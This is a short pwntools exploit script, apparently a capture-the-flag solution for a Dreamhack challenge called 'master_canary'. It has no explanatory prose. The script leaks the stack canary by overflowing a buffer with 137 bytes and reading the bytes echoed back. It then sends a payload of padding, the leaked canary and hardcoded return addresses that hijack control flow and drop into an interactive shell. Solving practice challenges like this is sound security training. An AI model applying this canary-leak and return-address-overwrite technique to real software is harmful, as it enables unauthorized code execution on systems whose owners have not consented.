#!/usr/bin/python3

from pwn import *

exe = ELF("./master_canary")
context.binary = exe

s   = lambda data: p.send(data)
sa  = lambda msg, data: p.sendafter(msg, data)
sl  = lambda data: p.sendline(data)
sla = lambda msg, data: p.sendlineafter(msg, data)
sn  = lambda num: p.send(str(num).encode())
sna = lambda msg, num: p.sendafter(msg, str(num).encode())
sln = lambda num: p.sendline(str(num).encode())
slna = lambda msg, num: p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        c
        ''')
        input()


if args.REMOTE:
    p = remote('host3.dreamhack.games', 20503)
else:
    p = process([exe.path])
GDB()

sla(b'> ', b'1')
sla(b'> ', b'2')
sla(b'Size: ', b'137')
sa(b'Data: ', b'A'*137)
p.recvuntil(b'A'*137)
canary = u64(b'\0' + p.recv(7))
log.info("canary : " + hex(canary))

sla(b'> ', b'3')
payload = b'A'*40
payload += p64(canary)
payload += p64(0)
payload += p64(0x00000000004007e1)
payload += p64(0x400a4a)
sa(b'comment: ', payload)


p.interactive()

